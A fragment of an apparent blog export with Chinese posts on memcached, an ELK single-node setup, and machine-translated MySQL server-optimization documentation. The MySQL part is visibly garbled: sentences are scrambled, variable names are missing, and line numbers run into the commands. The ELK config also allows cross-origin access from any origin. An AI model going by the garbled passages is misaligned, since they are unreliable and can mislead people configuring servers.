    <content type="text"><![CDATA[memcached 简介 Memcached的 Memcached.svg 开发者（S） Danga Interactive 初始发行 2003年5月22日 稳定版本 1.5.8 / 2018年5月25日; 39天前[1] 知识库 https://github.com/memcached/memcached 在维基数据上编辑此内容 写入 C 操作系统 跨平台 类型 分布式内存缓存系统 执照 修订BSD许可证[2] 网站 memcached .org Memcached（发音：mem-cash-dee，mem-cashed）是一种通用的分布式内存缓存系统。它通常用于通过在RAM中缓存数据和对象来加速动态数据库驱动的网站，以减少必须读取外部数据源（如数据库或API）的次数。Memcached是免费的开源软件，根据修订的BSD许可证授权。[2] Memcached在类Unix操作系统（至少是Linux和OS X）和Microsoft Windows上运行。这取决于libevent库。 Memcached的API提供了一个分布在多台机器上的非常大的哈希表。当表已满时，后续插入会导致较旧的数据以最近最少使用（LRU）顺序被清除。[3] [4]使用Memcached的应用程序通常将请求和添加分层到RAM中，然后再回到较慢的后备存储（例如数据库）上。 Memcached没有内部机制来跟踪可能发生的未命中，但是，某些第三方实用程序提供此功能。 {———-} 数据结构 key-value【string】 特点 client-server 结构 服务端、维护key-value 互不通信 客户端、自行管理数据在各个服务间的分配 性能 get获取时间戳、懒校验 内存不足 LRU算法、主动淘汰 多核存储、集群性能要高于redis 内存利用率要高于redis 集群 服务器互相独立 客户端hash存储数据]]></content>
      <categories>
        <category>java</category>
        <category>cache</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK 搭建]]></title>
    <url>%2F2018%2F03%2F24%2Flog%2Felk-1%2F</url>
    <content type="text"><![CDATA[elasticsearch 安装 官方下载地址：https://www.elastic.co/downloads/elasticsearchlinux执行 ：1curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.0.0.tar.gz 下载解压 【建议使用zsh】 修改配置文件config/elasticsearch.yml {———-} 12345678910111213141516171819# 集群的名字 cluster.name: cloud# 节点名字 node.name: node-1 # 数据存储目录（多个路径用逗号分隔） path.data: /usr/local/logUtils/elasticsearch/es-data# 日志目录 path.logs: /usr/local/logUtils/elasticsearch/log#本机的ip地址network.host: 192.168.0.135 #设置集群中master节点的初始列表，可以通过这些节点来自动发现新加入集群的节点discovery.zen.ping.unicast.hosts: [&quot;192.168.161.128&quot;]# 设置节点间交互的tcp端口（集群）,(默认9300) transport.tcp.port: 9300 # 监听端口（默认） http.port: 9200 # 增加参数，使head插件可以访问es http.cors.enabled: true http.cors.allow-origin: &quot;*&quot; 运行 bin下的 elasticsearch 进行启动后台启动 bin/elasticsearch -d 启动结果如下 启动会遇到的问题1、非root权限启动新建用户 es然后把 elasticsearch 文件夹权限归给 新用户es1chown -R es:es elasticsearch 2、 软硬进程限制 max file descriptors [4096] for elasticsearch process likely too low, increase to at least [65536] 解决办法1vi /etc/security/limits.conf 文后添加 然后使用source 重新加载并使用 ulimit -n 查看 是否为 65536 如果还是1024 那么重新连接linux 试下 3、.max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144] 解决办法 ：12执行 ：sysctl -w vm.max_map_count=655360查看执行结果 ： sysctl -a | grep vm.max_map_count elasticsearch 插件 head 安装 下载head插件1234wget https://github.com/mobz/elasticsearch-head/archive/master.zip安装nodewget https://npm.taobao.org/mirrors/node/latest-v4.x/node-v4.4.7-linux-x64.tar.gztar -zxvf node-v4.4.7-linux-x64.tar.gz 配置环境变量安装 gruntcd /opt/elasticsearch-head-masternpm install -g grunt-cli //执行后会生成node_modules文件夹grunt是基于Node.js的项目构建工具，可以进行打包压缩、测试、执行等等的工作，head插件就是通过grunt启动 检查是否安装成功grunt -version 修改head 插件源码vi Gruntfile.js vi _site/app.js 文件较大 建议下载下来 使用文本编辑器查找或者使用命令替换localhost 为 你的ip 运行headhead根目录运行 npm install启动head grunt server后台启动 nohup grunt server &amp; Logstash 安装 官方下载地址 ：https://www.elastic.co/downloads/logstash12345678910111213141516171819202122linux安装：curl -L -O https://artifacts.elastic.co/downloads/logstash/logstash-6.0.0.tar.gzconfig 添加 配置文件vi logstash.confinput &#123; # stdin &#123; &#125; tcp &#123; # host:port就是上面appender中的 destination， # 这里其实把logstash作为服务，开启9250端口接收logback发出的消息 host =&gt; &quot;192.168.0.135&quot; port =&gt; 9250 mode =&gt; &quot;server&quot; tags :&gt; [&quot;tags&quot;] codec =&gt; json_lines &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [&quot;localhost:9200&quot;] &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 启动logstash1nohup ./logstash -f ../config/logstash.conf &amp; Kibana 安装 官方下载地址：https://www.elastic.co/downloads/kibana1curl -L -O https://artifacts.elastic.co/downloads/kibana/kibana-6.0.0-linux-x86_64.tar.gz 修改配置文件123456789vim config/kibana.ymlserver.host:&quot;192.168.0.135&quot;elasticsearch.url:http://192.168.0.135:9200启动kibanabin/kibana 启动服务 http://192.168.0.135:5601 至此 ELK服务单机版部署完成 springcloud 集成logback 引入pom123456&lt;!--日志发送logstash--&gt; &lt;dependency&gt; &lt;groupId&gt;net.logstash.logback&lt;/groupId&gt; &lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt; logback-spring.xml 123456789101112&lt;appender name=&quot;LOGSTASH&quot; class=&quot;net.logstash.logback.appender.LogstashTcpSocketAppender&quot;&gt; &lt;!-- destination 是 logstash 服务的 host:port， 相当于和 logstash 建立了管道，将日志数据定向传输到 logstash --&gt; &lt;destination&gt;192.168.0.135:9250&lt;/destination&gt; &lt;encoder charset=&quot;UTF-8&quot; class=&quot;net.logstash.logback.encoder.LogstashEncoder&quot;/&gt; &lt;/appender&gt; &lt;root level=&quot;INFO&quot;&gt; &lt;appender-ref ref=&quot;LOGSTASH&quot;/&gt; &lt;/root&gt;]]></content>
      <categories>
        <category>java</category>
        <category>log</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【服务器优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-system%2F</url>
    <content type="text"><![CDATA[本节讨论数据库服务器的优化技术，主要处理系统配置而不是调整SQL语句。本节中的信息适用于想要确保他们管理的服务器的性能和可扩展性的DBA; 对于构建包括设置数据库的安装脚本的开发人员; 以及那些希望最大限度提高自身生产力的开发，测试等人员自己运行MySQL。 8.12.1系统因素 123456789101112131415161718192021一些系统级因素可能会以主要方式影响性能：如果有足够的RAM，则可以删除所有交换设备。某些操作系统在某些情况下使用交换设备，即使您拥有可用内存。避免对MyISAM表格进行外部锁定 。默认值是禁用外部锁定。在 --external-locking和 --skip-external-locking 选项明确地启用和禁用外部锁定。只要您只运行一台服务器，禁用外部锁定不会影响MySQL的功能。请记住在运行myisamchk之前取下服务器（或者锁定并冲洗相关的表格） 。在某些系统中，强制禁用外部锁定是因为它无法工作。唯一不能禁用外部锁定的情况是在 同一数据上运行多个MySQL 服务器（而不是客户端），或者如果您运行 myisamchk检查（而不是修复）表而不告知服务器先刷新和锁定表。请注意 ，除了使用NDB群集时，通常不建议使用多个MySQL服务器同时访问相同的数据。该LOCK TABLES和 UNLOCK TABLES语句使用内部锁定，所以你可以使用他们，即使外部锁定被禁用。 {———-} 8.12.2优化磁盘I / O 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283本节介绍如何在您将更多更快的存储硬件投入数据库服务器时配置存储设备。有关优化 InnoDB配置以提高I / O性能的信息，请参见第8.5.8节“优化InnoDB磁盘I / O”。磁盘寻求是一个巨大的性能瓶颈。当数据量开始变得如此之大以至于不能有效缓存时，这个问题就会变得更加明显。对于您可以随意访问数据的大型数据库，您可以确保至少需要一次磁盘查找以及一些磁盘写入操作。为了尽量减少这个问题，请使用低寻道时间的磁盘。通过将文件符号链接到不同的磁盘或剥离磁盘来增加可用磁盘主轴的数量（从而减少查找开销）：使用符号链接这意味着，对于MyISAM表，您可以将索引文件和数据文件从其在数据目录中的常用位置符号链接到另一个磁盘（也可以是条带化的）。这使得查找和读取时间更好，假设磁盘也不用于其他目的。参见 第8.12.3节“使用符号链接”。符号链接不支持与InnoDB表一起使用 。但是，可以将InnoDB数据和日志文件放置在不同的物理磁盘上。有关更多信息，请参见第8.5.8节“优化InnoDB磁盘I / O”。条带化条带化意味着您有许多磁盘，并将第一个磁盘块，第二个磁盘上的第二个磁盘N块和（）磁盘上的第 - 个磁盘块，依此类推。这意味着如果您的正常数据大小小于条带大小（或完全对齐），则可以获得更好的性能。分条非常依赖操作系统和条带大小，因此可以用不同的条带大小对应用程序进行基准测试。参见第8.13.2节“使用自己的基准”。 N MOD number_of_disks对于分拆的速度差是 非常依赖的参数。根据您设置条带参数和磁盘数量的方式，您可能会得到数量级差异。您必须选择针对随机或顺序访问进行优化。为了保证可靠性，您可能需要使用RAID 0 + 1（分条加镜像），但在这种情况下，您需要2个 N驱动器来保存 N数据驱动器。如果你有钱，这可能是最好的选择。但是，您可能还需要投资一些卷管理软件来有效处理它。一个好的选择是根据数据类型的重要性来改变RAID级别。例如，存储可在RAID 0磁盘上重新生成的半重要数据，但存储真正重要的数据，例如主机信息和日志记录在RAID 0 + 1或RAID N磁盘上。N由于更新奇偶校验位所需的时间，如果您有很多写操作，则RAID 可能会成为问题。您还可以设置数据库使用的文件系统的参数：如果您不需要知道上次访问文件的时间（这在数据库服务器上并不真正有用），则可以使用该-o noatime 选项安装文件系统。这会跳过对文件系统inode中最后一次访问时间的更新，从而避免一些磁盘搜索。在许多操作系统上，可以通过将该-o async选项挂载来将文件系统设置为异步更新。如果您的计算机相当稳定，这应该可以提供更好的性能而不会牺牲太多的可靠性。（这个标志在Linux上默认打开。）在MySQL中使用NFS建议在考虑使用NFS与MySQL时谨慎。潜在问题因操作系统和NFS版本而异，其中包括：放置在NFS卷上的MySQL数据和日志文件被锁定并无法使用。例如，如果多个MySQL实例访问相同的数据目录，或由于停电等原因导致MySQL不正确关闭，则可能会出现锁定问题。NFS版本4通过引入基于咨询和基于租约的锁定来解决潜在的锁定问题。但是，不建议在MySQL实例中共享数据目录。由于收到的消息乱序或网络流量丢失而​​导致数据不一致。要避免此问题，请使用TCP hard和 intr安装选项。最大文件大小限制。NFS版本2客户端只能访问文件的最低2GB（带符号32位偏移量）。NFS版本3客户端支持较大的文件（最多64位偏移量）。支持的最大文件大小还取决于NFS服务器的本地文件系统。在专业SAN环境或其他存储系统中使用NFS往往比在这种环境之外使用NFS提供更高的可靠性。但是，SAN环境中的NFS可能比直接连接或总线连接的非循环存储要慢。如果您选择使用NFS，建议使用NFS版本4或更高版本，与在部署到生产环境之前彻底测试NFS设置一样。 8.12.3使用符号链接 8.12.3.1在Unix上使用数据库的符号链接 8.12.3.2在Unix上使用MyISAM表的符号链接 8.12.3.3在Windows上使用数据库的符号链接 123456789101112131415您可以将数据库或表从数据库目录移动到其他位置，并用符号链接替换它们到新的位置。例如，您可能想要执行此操作，将数据库移动到具有更多可用空间的文件系统，或者通过将表分布到不同的磁盘来提高系统的速度。对于InnoDB表，请使用语句中的DATA DIRECTORY子句CREATE TABLE而不是符号链接，如第14.7.5节“在数据目录之外创建文件 - 表 - 表空间”中所述。这项新功能是支持的跨平台技术。推荐的方法是将整个数据库目录符号链接到不同的磁盘。符号链接 MyISAM表仅作为最后的手段。要确定数据目录的位置，请使用以下语句：SHOW VARIABLES LIKE&apos;datadir&apos;; 8.12.3.1在Unix上使用数据库的符号链接 12345678910111213在Unix上，符号链接数据库的方式首先是在有空闲空间的磁盘上创建一个目录，然后从MySQL数据目录创建一个到它的软链接。shell&gt; mkdir /dr1/databases/testshell&gt;ln -s /dr1/databases/test /path/to/datadirMySQL不支持将一个目录链接到多个数据库。只要不在数据库之间建立符号链接，用符号链接替换数据库目录就可以工作。假设您db1在MySQL数据目录下有一个数据库 ，然后创建一个符号链接db2指向 db1：shell&gt; shell&gt;cd /path/to/datadirln -s db1 db2其结果是，对于任何表tbl_a中 db1，也似乎是一个表 tbl_a中db2。如果一个客户端更新db1.tbl_a并且另一个客户端更新db2.tbl_a，则可能出现问题。 8.12.3.2在Unix上使用MyISAM表的符号链接 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970符号链接仅完全支持 MyISAM表格。对于其他存储引擎的表使用的文件，如果尝试使用符号链接，则可能会遇到奇怪的问题。对于InnoDB表，请使用 第14.7.5节“在数据目录之外创建文件 - 表 - 表空间”中介绍的替代技术。不要在没有完全可操作realpath()调用的系统上建立符号链接表。（Linux和Solaris支持realpath()）。要确定您的系统是否支持符号链接，请have_symlink使用以下语句检查系统变量的值：SHOW VARIABLES LIKE&apos;have_symlink&apos;;处理MyISAM 表的符号链接的工作如下：在数据目录中，您始终拥有表格format（.frm）文件，data（.MYD）文件和index（.MYI）文件。数据文件和索引文件可以在别处移动并通过符号链接替换到数据目录中。格式文件不能。您可以将数据文件和索引文件独立链接到不同的目录。要指示正在运行的MySQL服务器执行符号链接，请使用DATA DIRECTORY和 INDEX DIRECTORY选项 CREATE TABLE。请参见 第13.1.18节“CREATE TABLE语法”。或者，如果 mysqld未运行，则可以使用 命令行中的ln -s手动完成符号链接。注意用的一方或双方使用的路径DATA DIRECTORY和INDEX DIRECTORY选项可能不包括MySQL的 data目录。（错误＃32167）myisamchk不会替换数据文件或索引文件的符号链接。它直接在符号链接指向的文件上工作。任何临时文件都在数据文件或索引文件所在的目录中创建。同样是真实的 ALTER TABLE， OPTIMIZE TABLE和 REPAIR TABLE语句。注意当您删除使用符号链接的表时，符号 链接和符号链接点将被删除的文件。这是一个非常好的理由，不作为系统 运行 mysqldroot或允许系统用户拥有对MySQL数据库目录的写入权限。如果使用ALTER TABLE ... RENAMEor 重命名表 RENAME TABLE并且不将该表移动到另一个数据库，那么数据库目录中的符号链接将重命名为新名称，并相应地重命名数据文件和索引文件。如果您使用 ALTER TABLE ... RENAME或RENAME TABLE将表移动到另一个数据库，则该表将移动到其他数据库目录。如果表名更改，新数据库目录中的符号链接将重命名为新名称，并相应地重命名数据文件和索引文件。如果您不使用符号链接，请使用该 选项启动 mysqld， --skip-symbolic-links以确保没有人可以使用 mysqld删除或重命名数据目录之外的文件。这些表符号链接操作不受支持：ALTER TABLE忽略 DATA DIRECTORY和INDEX DIRECTORY表格选项。如前所述，只有数据和索引文件可以是符号链接。该.frm文件绝 不能是符号链接。尝试执行此操作（例如，使一个表名称成为另一个表的同义词）会产生不正确的结果。假设你db1在MySQL数据目录下有一个数据库，tbl1在这个数据库中有一个表，并且在db1你创建一个tbl2指向符号链接的目录中 tbl1：shell&gt; shell&gt; shell&gt; shell&gt;cd /path/to/datadir/db1ln -s tbl1.frm tbl2.frmln -s tbl1.MYD tbl2.MYDln -s tbl1.MYI tbl2.MYI问题的结果，如果一个线程读取 db1.tbl1，而另一个线程更新 db1.tbl2：查询缓存是“ 被愚弄的 ”（它无法知道tbl1尚未更新，因此它会返回过期的结果）。ALTER声明 tbl2失败。 8.12.3.3在Windows上使用数据库的符号链接 123456789101112131415161718192021222324在Windows上，符号链接可用于数据库目录。这使您可以通过设置数据库目录的不同位置（例如，在不同的磁盘上）来设置数据库目录的符号链接。在Windows上使用数据库符号链接与在Unix上使用数据库符号链接类似，尽管设置链接的过程有所不同。假设你想要放置一个名为mydbat 的数据库的数据库目录D:\data\mydb。为此，请在指向的MySQL数据目录中创建一个符号链接 D:\data\mydb。但是，在创建符号链接之前，D:\data\mydb必要时通过创建它来确保该 目录存在。如果您已mydb在数据目录中指定了一个数据库目录，请将其移至D:\data。否则，符号链接将无效。为避免出现问题，请确保在移动数据库目录时服务器未运行。Windows Vista，Windows Server 2008或更新版本具有原生符号链接支持，因此您可以使用mklink命令创建符号链接 。该命令需要管理权限。将位置更改为数据目录：C：\&gt; cd \path\to\datadir在数据目录中，创建一个名为的mydb指向数据库目录位置的符号链接 ：C：\&gt; mklink /d mydb D:\data\mydb在此之后，数据库mydb中创建的所有表格 都将在中创建 D:\data\mydb。 8.12.4优化内存使用 8.12.4.1 MySQL如何使用内存 8.12.4.2启用大页面支持 8.12.4.1 MySQL如何使用内存 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267MySQL分配缓冲区和缓存以提高数据库操作的性能。默认配置旨在允许MySQL服务器在具有大约512MB内存的虚拟机上启动。您可以通过增加某些缓存和缓冲区相关系统变量的值来提高MySQL的性能。您还可以修改默认配置以在内存有限的系统上运行MySQL。以下列表描述了MySQL使用内存的一些方式。在适用的情况下，引用相关的系统变量。有些项目是存储引擎或功能特定的。所述InnoDB缓冲器池是保持缓存的存储区InnoDB表，索引，及其它辅助缓冲器中的数据。为了提高高容量读取操作的效率，缓冲池分为 可能包含多行的页面。为了高速缓存管理的效率，缓冲池被实现为页面的链接列表; 很少使用的数据使用LRU算法的变体超时缓存 。有关更多信息，请参见第14.6.3.1节“InnoDB缓冲池”。缓冲池的大小对系统性能很重要：InnoDB在服务器启动时使用malloc()操作为整个缓冲池分配内存 。所述 innodb_buffer_pool_size 系统变量定义缓冲池大小。通常，推荐 innodb_buffer_pool_size 值是系统内存的50％到75％。 innodb_buffer_pool_size 可以在服务器运行时动态配置。有关更多信息，请参见 第14.6.3.2节“配置InnoDB缓冲池大小”。在具有大量内存的系统上，可以通过将缓冲池分为多个缓冲池实例来提高并发性 。所述 innodb_buffer_pool_instances 系统变量定义缓冲池实例的数量。缓冲池太小可能会导致过度搅动，因为页面仅从缓冲池刷新到短时间内再次需要。由于竞争内存，缓冲池太大可能会导致交换。所有线程共享MyISAM 密钥缓冲区。的 key_buffer_size系统变量决定其大小。对于MyISAM服务器打开的每个表，索引文件都打开一次; 对于每个访问表的并发运行线程，数据文件都会打开一次。对于每个并发线程，分配一个表结构，每列的列结构和一个大小的缓冲区 （其中是最大行长度，不包括 列）。一 列需要五到八个字节加上数据的长度 。该 存储引擎维护用于内部使用一个额外的行缓冲。 3 * NNBLOBBLOBBLOBMyISAM所述myisam_use_mmap 系统变量可以被设置为1，使能对所有内存映射MyISAM表。如果内部内存临时表变得太大（使用tmp_table_size和 max_heap_table_size 系统变量确定 ），MySQL会自动将表从内存转换为磁盘格式。磁盘上的临时表使用由internal_tmp_disk_storage_engine 系统变量定义的存储引擎 。您可以按照第8.4.4节“MySQL中的内部临时表使用”中所述增加允许的临时表大小 。对于使用MEMORY明确创建的表CREATE TABLE，只有 max_heap_table_size 系统变量决定允许表增长多少，并且没有转换为磁盘格式。在MySQL性能模式是在低级别监控MySQL服务器执行的功能。性能模式以增量方式动态分配内存，将其内存使用扩展到实际的服务器负载，而不是在服务器启动期间分配所需的内存。一旦分配内存，在服务器重新启动之前它不会被释放。有关更多信息，请参见 第25.16节“性能模式内存分配模型”。服务器用于管理客户端连接的每个线程都需要一些线程特定的空间。以下列表指示这些以及哪些系统变量控制其大小：堆栈（thread_stack）连接缓冲区（net_buffer_length）结果缓冲区（net_buffer_length）连接缓冲区和结果缓冲区每个都以大小等于net_buffer_length字节的大小开始 ，但max_allowed_packet根据需要动态放大到 字节。net_buffer_length在每个SQL语句之后，结果缓冲区会缩小为 字节。当语句正在运行时，还会分配当前语句字符串的副本。每个连接线程都使用内存来计算语句摘要。服务器分配 max_digest_length每个会话的字节数。请参见 第25.9节“性能架构语句摘要”。所有线程共享相同的基本内存。当不再需要线程时，分配给它的内存将被释放并返回到系统，除非线程回到线程缓存中。在这种情况下，内存保持分配。每个执行表的顺序扫描的请求都会分配一个读取缓冲区。的 read_buffer_size系统变量决定缓冲器大小。在以任意顺序读取行时（例如，在排序后）， 可能会分配一个 随机读取缓冲区以避免磁盘搜索。的 read_rnd_buffer_size 系统变量决定缓冲器大小。所有连接都在一次执行中执行，大多数连接都可以在不使用临时表的情况下完成。大多数临时表是基于内存的哈希表。具有较大行长度（以所有列长度的总和计算）或包含BLOB列的临时表 存储在磁盘上。大多数执行排序的请求会根据结果集大小分配排序缓冲区和零到两个临时文件。请参见第B.5.3.5节“MySQL存储临时文件的位置”。几乎所有的解析和计算都是在线程本地和可重用的内存池中完成的。小项目不需要内存开销，从而避免了正常的慢速内存分配和释放。内存仅分配给意外大的字符串。对于每个包含BLOB 列的表，动态地放大缓冲区以读取更大的BLOB值。如果您扫描一个表格，缓冲区会增大到 BLOB最大值。MySQL需要表缓存的内存和描述符。所有使用中表格的处理程序结构都保存在表格缓存中，并作为“ 先进先出 ”（FIFO）进行管理。所述 table_open_cache系统变量定义初始表高速缓存大小; 请参见 第8.4.3.1节“MySQL如何打开和关闭表”。MySQL还需要用于表定义缓存的内存。所述 table_definition_cache 系统变量定义的表定义（距离的数量.frm可以存储在表中定义的高速缓存文件）。如果您使用大量表格，则可以创建大型表格定义缓存以加快表格的打开速度。与表缓存不同，表定义缓存占用更少的空间并且不使用文件描述符。一个FLUSH TABLES语句或 中mysqladmin冲水表命令关闭不在使用一次的所有表，并标记所有在用的表被关闭当前正在执行的线程结束时。这有效地释放了大部分使用中的内存。FLUSH TABLES直到所有表都关闭后才会返回。服务器在内存中缓存信息的结果 GRANT， CREATE USER， CREATE SERVER，和 INSTALL PLUGIN语句。该内存不能由相应的释放 REVOKE， DROP USER， DROP SERVER，和 UNINSTALL PLUGIN 语句，所以执行导致缓存报表的多个实例的服务器上，将有内存使用的增加。这个缓存的内存可以被释放FLUSH PRIVILEGES。ps和其他系统状态程序可能会报告 mysqld使用大量内存。这可能是由不同内存地址上的线程堆栈引起的。例如，Solaris的 ps版本将 堆栈之间未使用的内存计为已用内存。要验证这一点，请检查可用的交换 swap -s。我们 用几个内存泄漏检测器（商业和开源）测试 mysqld，所以应该没有内存泄漏。监视MySQL内存使用情况以下示例演示如何使用 Performance Schema 和sys模式来监视MySQL内存使用情况。大多数性能架构内存工具默认情况下处于禁用状态。可以通过更新ENABLED性能模式setup_instruments表的列 来启用仪器 。记忆仪器的名称形式为 ，其中是诸如或的值，并且 是仪器的详细信息。 memory/code_area/instrument_namecode_areasqlinnodbinstrument_name要查看可用的MySQL内存工具，请查询性能架构 setup_instruments表。以下查询返回所有代码区域的数百个内存工具。MySQL的&gt; SELECT * FROM performance_schema.setup_instruments WHERE NAME LIKE &apos;%memory%&apos;;您可以通过指定代码区域来缩小结果。例如，您可以InnoDB通过指定innodb代码区域将结果限制在 内存仪器中。MySQL的&gt; SELECT * FROM performance_schema.setup_instruments WHERE NAME LIKE &apos;%memory/innodb%&apos;;+ ------------------------------------------- + ----- ---- + ------- +| NAME | ENABLED | TIMED |+ ------------------------------------------- + ----- ---- + ------- +| 内存/ innodb /自适应哈希索引| NO | NO || 内存/ innodb / buf_buf_pool | NO | NO || 内存/ innodb / dict_stats_bg_recalc_pool_t | NO | NO || 内存/ innodb / dict_stats_index_map_t | NO | NO || 内存/ innodb / dict_stats_n_diff_on_level | NO | NO || 内存/ innodb / other | NO | NO || 内存/ innodb / row_log_buf | NO | NO || 内存/ innodb / row_merge_sort | NO | NO || 内存/ innodb / std | NO | NO || 内存/ innodb / trx_sys_t :: rw_trx_ids | NO | NO |...根据您的MySQL安装代码区域可能包括performance_schema， sql，client， innodb，myisam， csv，memory， blackhole， archive， partition，和其他人。要启用内存工具，performance-schema-instrument请在MySQL配置文件中添加一条 规则。例如，要启用所有内存工具，请将此规则添加到您的配置文件并重新启动服务器：性能架构仪器=“存储器/％=计数”注意在启动时启用内存工具可确保启动时发生的内存分配计数。重新启动服务器后，ENABLEDPerformance Schema setup_instruments 表的 列应报告YES您启用的内存工具。内存操作未定时TIMED，setup_instruments表中的 列 被忽略。MySQL的&gt; SELECT * FROM performance_schema.setup_instruments WHERE NAME LIKE &apos;%memory/innodb%&apos;;+ ------------------------------------------- + ----- ---- + ------- +| NAME | ENABLED | TIMED |+ ------------------------------------------- + ----- ---- + ------- +| 内存/ innodb /自适应哈希索引| NO | NO || 内存/ innodb / buf_buf_pool | NO | NO || 内存/ innodb / dict_stats_bg_recalc_pool_t | NO | NO || 内存/ innodb / dict_stats_index_map_t | NO | NO || 内存/ innodb / dict_stats_n_diff_on_level | NO | NO || 内存/ innodb / other | NO | NO || 内存/ innodb / row_log_buf | NO | NO || 内存/ innodb / row_merge_sort | NO | NO || 内存/ innodb / std | NO | NO || 内存/ innodb / trx_sys_t :: rw_trx_ids | NO | NO |...查询记忆仪器数据。在本例中，内存仪器数据在Performance Schema memory_summary_global_by_event_name 表格中查询，该 表格通过对数据进行汇总 EVENT_NAME。这 EVENT_NAME是乐器的名称。以下查询返回InnoDB缓冲池的内存数据 。有关列说明，请参见 第25.11.15.9节“内存汇总表”。MySQL的&gt; SELECT * FROM performance_schema.memory_summary_global_by_event_name WHERE EVENT_NAME LIKE &apos;memory/innodb/buf_buf_pool&apos;\G EVENT_NAME：内存/ innodb / buf_buf_pool COUNT_ALLOC：1 COUNT_FREE：0 SUM_NUMBER_OF_BYTES_ALLOC：137428992 SUM_NUMBER_OF_BYTES_FREE：0 LOW_COUNT_USED：0 CURRENT_COUNT_USED：1 HIGH_COUNT_USED：1 LOW_NUMBER_OF_BYTES_USED：0CURRENT_NUMBER_OF_BYTES_USED：137428992 HIGH_NUMBER_OF_BYTES_USED：137428992可以使用sys架构memory_global_by_current_bytes 表来查询相同的底层数据，该 架构 表显示全局服务器当前的内存使用情况，按分配类型细分。MySQL的&gt; SELECT * FROM sys.memory_global_by_current_bytes WHERE event_name LIKE &apos;memory/innodb/buf_buf_pool&apos;\G*************************** 1. row ******************** ******* event_name：内存/ innodb / buf_buf_pool current_count：1 current_alloc：131.06 MiBcurrent_avg_alloc：131.06 MiB high_count：1 high_alloc：131.06 MiB high_avg_alloc：131.06 MiB该sys模式查询current_alloc通过代码区域聚合当前分配的内存（）：MySQL的&gt; SELECT SUBSTRING_INDEX(event_name,&apos;/&apos;,2) AS code_area, sys.format_bytes(SUM(current_alloc)) AS current_alloc FROM sys.x$memory_global_by_current_bytes GROUP BY SUBSTRING_INDEX(event_name,&apos;/&apos;,2) ORDER BY SUM(current_alloc) DESC;+ --------------------------- + -------- +| code_area | current_alloc |+ --------------------------- + -------- +| 内存/ innodb | 843.24 MiB || 内存/ performance_schema | 81.29 MiB || 内存/ mysys | 8.20 MiB || memory / sql | 2.47 MiB || 内存/内存| 174.01 KiB || 内存/ myisam | 46.53 KiB || 内存/黑洞| 512字节|| 内存/联合| 512字节|| 内存/ csv | 512字节|| 记忆/ vio | 496字节|+ --------------------------- + -------- +有关sys模式的更多信息 ，请参阅 第26章MySQL sys模式。 8.12.4.2启用大页面支持 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106某些硬件/操作系统体系结构支持的内存页面大于默认值（通常为4KB）。这种支持的实际实施取决于底层硬件和操作系统。执行大量内存访问的应用程序可能通过使用大页面来获得性能改进，这是因为减少了翻译旁视缓冲区（TLB）缺失。在MySQL中，InnoDB可以使用大页面为其缓冲池和额外的内存池分配内存。标准使用MySQL中的大页面将尝试使用支持的最大大小，最大为4MB。在Solaris下， “ 超大页面 ”功能可以使用最多256MB的页面。此功能适用于最新的SPARC平台。可以使用--super-large-pages或 --skip-super-large-pages 选项启用或禁用它 。MySQL还支持大型页面支持的Linux实现（在Linux中称为HugeTLB）。在Linux上可以使用大页面之前，必须启用内核来支持它们，并且需要配置HugeTLB内存池。作为参考，HugeTBL API记录在 Documentation/vm/hugetlbpage.txt您的Linux源文件中。最近的一些系统（如红帽企业Linux）的内核似乎默认启用了大页面功能。要检查内核是否为真，请使用以下命令并查找包含“ 巨大 ”的输出行 ：外壳&gt; cat /proc/meminfo | grep -i hugeHugePages_Total：0HugePages_Free：0HugePages_Rsvd：0HugePages_Surp：0Hugepagesize：4096 kB非空命令输出表示存在大页面支持，但零值表示没有配置页面供使用。如果您的内核需要重新配置以支持大页面，请查阅该hugetlbpage.txt文件以获取说明。假设您的Linux内核已启用大页面支持，请使用以下命令将其配置为供MySQL使用。通常，将这些rc文件放入系统启动序列中执行的 文件或等效启动文件中，以便每次系统启动时执行这些命令。在MySQL服务器启动之前，命令应该在引导序列中尽早执行。请务必根据您的系统更改分配编号和组编号。＃设置要使用的页数。＃每页通常为2MB，因此值为20 = 40MB。＃这个命令实际上是分配内存，所以这么多＃内存必须可用。echo 20&gt; / proc / sys / vm / nr_hugepages＃设置允许访问的组号＃内存（在这种情况下为102）。mysql用户必须是＃此组的成员。echo 102&gt; / proc / sys / vm / hugetlb_shm_group＃增加每段允许的shmem数量＃（在这种情况下为12G）。echo 1560281088&gt; / proc / sys / kernel / shmmax＃增加共享内存总量。价值＃是页数。4KB /页，4194304 = 16GB。echo 4194304&gt; / proc / sys / kernel / shmall对于MySQL的使用情况，您通常希望值 shmmax接近的值 shmall。要验证大页面配置，请/proc/meminfo按前面所述重新检查 。现在你应该看到一些非零值：外壳&gt; cat /proc/meminfo | grep -i hugeHugePages_Total：20HugePages_Free：20HugePages_Rsvd：0HugePages_Surp：0Hugepagesize：4096 kB利用这个最后一步 hugetlb_shm_group就是为 mysql用户提供一个“ 无限 ”的 值，用于memlock限制。这可以通过编辑/etc/security/limits.conf或将以下命令添加到 mysqld_safe脚本来完成：ulimit -l无限制将ulimit命令添加到 mysqld_safe会导致 root用户unlimited在切换到mysql用户之前 设置memlock限制 。（这个假定 mysqld_safe由启动 